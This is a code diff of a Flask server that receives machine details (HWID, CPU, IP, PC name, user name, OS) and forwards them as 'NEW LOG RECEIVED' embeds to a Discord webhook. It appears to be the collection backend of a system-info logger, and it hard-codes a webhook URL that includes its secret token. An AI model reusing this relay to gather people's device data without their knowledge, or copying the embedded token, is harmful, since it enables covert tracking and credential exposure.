@@ -4,8 +4,8 @@ import os
 
 app = Flask(__name__)
 
-# 🔥 DISCORD WEBHOOK
-WEBHOOK_URL = "hhttps://discord.com/api/webhooks/1486628249042948177/Sd7goOSOTneyDNHerFR5_ZPOHfCbk6rtcz0ei3Hgcd-PxzNCskU-aHFk13AY20GgiOzm"
+# 🔥 APNA DISCORD WEBHOOK
+WEBHOOK_URL = "https://discord.com/api/webhooks/1486628249042948177/Sd7goOSOTneyDNHerFR5_ZPOHfCbk6rtcz0ei3Hgcd-PxzNCskU-aHFk13AY20GgiOzm"
 
 
 @app.route("/")
@@ -18,32 +18,50 @@ def log():
     try:
         data = request.get_json(force=True)
 
-        print("📥 RECEIVED:", data)
+        print("📥 RECEIVED DATA:", data)
 
         if not data:
             return jsonify({"error": "No data"}), 400
 
+        # 🔥 SAFE EMBED
         embed = {
-            "title": "NEW PC FULL DETAILS",
+            "title": "BKM PC DETAILS",
+            "description": "New system data received",
             "color": 65280,
-            "fields": [
-                {"name": "HWID", "value": str(data.get("uuid", "N/A")), "inline": False},
-                {"name": "CPU", "value": str(data.get("cpu", "N/A")), "inline": False},
-                {"name": "BIOS", "value": str(data.get("bios", "N/A")), "inline": False},
-                {"name": "BOARD", "value": str(data.get("board", "N/A")), "inline": False},
-                {"name": "RAM", "value": str(data.get("ram", "N/A")), "inline": False},
-                {"name": "GPU", "value": str(data.get("gpu", "N/A")), "inline": False},
-                {"name": "IP", "value": str(data.get("ip", "N/A")), "inline": False},
-                {"name": "PC", "value": str(data.get("pc", "N/A")), "inline": True},
-                {"name": "USER", "value": str(data.get("user", "N/A")), "inline": True},
-                {"name": "OS", "value": str(data.get("os", "N/A")), "inline": False}
-            ]
+            "fields": []
         }
 
-        # 🚀 SEND
+        # ✅ SAFE FIELD ADD FUNCTION
+        def add_field(name, key):
+            val = str(data.get(key, "N/A"))
+            if not val or val.strip() == "":
+                val = "N/A"
+
+            embed["fields"].append({
+                "name": name,
+                "value": val[:1000],  # limit safe
+                "inline": False
+            })
+
+        # 📊 ADD ALL DATA
+        add_field("HWID", "uuid")
+        add_field("CPU", "cpu")
+        add_field("BIOS", "bios")
+        add_field("BOARD", "board")
+        add_field("RAM", "ram")
+        add_field("GPU", "gpu")
+        add_field("IP", "ip")
+        add_field("PC NAME", "pc")
+        add_field("USER", "user")
+        add_field("OS", "os")
+
+        # 🚀 SEND TO DISCORD
         r = requests.post(
             WEBHOOK_URL,
-            json={"embeds": [embed]},
+            json={
+                "content": "🔥 NEW LOG RECEIVED",
+                "embeds": [embed]
+            },
             timeout=10
         )
 
@@ -60,5 +78,6 @@ def log():
         return jsonify({"error": str(e)}), 500
 
 
+# 🔥 HOSTING (Render compatible)
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
